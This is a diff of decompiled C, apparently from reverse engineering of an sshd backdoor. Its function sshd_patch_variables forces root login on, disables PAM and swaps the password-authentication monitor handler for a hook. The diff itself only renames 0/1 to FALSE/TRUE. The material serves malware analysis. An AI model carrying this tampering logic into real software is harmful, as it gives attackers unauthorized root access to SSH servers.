@@ -32,40 +32,40 @@ BOOL sshd_patch_variables
   if ((((global_ctx == (global_context_t *)0x0) ||
        (psVar2 = global_ctx->sshd_ctx, psVar2 == (sshd_ctx_t *)0x0)) ||
       (psVar3 = psVar2->mm_answer_authpassword_hook, psVar3 == (sshd_monitor_func_t)0x0)) ||
-     (psVar2->have_mm_answer_authpassword == 0)) {
-    return 0;
+     (psVar2->have_mm_answer_authpassword == FALSE)) {
+    return FALSE;
   }
-  if (skip_root_patch == 0) {
+  if (skip_root_patch == FALSE) {
     piVar4 = psVar2->permit_root_login_ptr;
     if (piVar4 == (int *)0x0) {
-      return 0;
+      return FALSE;
     }
     iVar1 = *piVar4;
     if (iVar1 < 3) {
       if (iVar1 < 0) {
-        return 0;
+        return FALSE;
       }
       *piVar4 = 3;
     }
     else if (iVar1 != 3) {
-      return 0;
+      return FALSE;
     }
   }
-  if (disable_pam != 0) {
+  if (disable_pam != FALSE) {
     puVar5 = (uint *)psVar2->use_pam_ptr;
     if (puVar5 == (uint *)0x0) {
-      return 0;
+      return FALSE;
     }
     if (1 < *puVar5) {
-      return 0;
+      return FALSE;
     }
     *puVar5 = 0;
   }
-  if (replace_monitor_reqtype == 0) {
+  if (replace_monitor_reqtype == FALSE) {
     monitor_reqtype = *(int *)(psVar2->mm_answer_authpassword_ptr + -1) + 1;
   }
   psVar2->monitor_reqtype_authpassword = monitor_reqtype;
   *psVar2->mm_answer_authpassword_ptr = psVar3;
-  return 1;
+  return TRUE;
 }
 
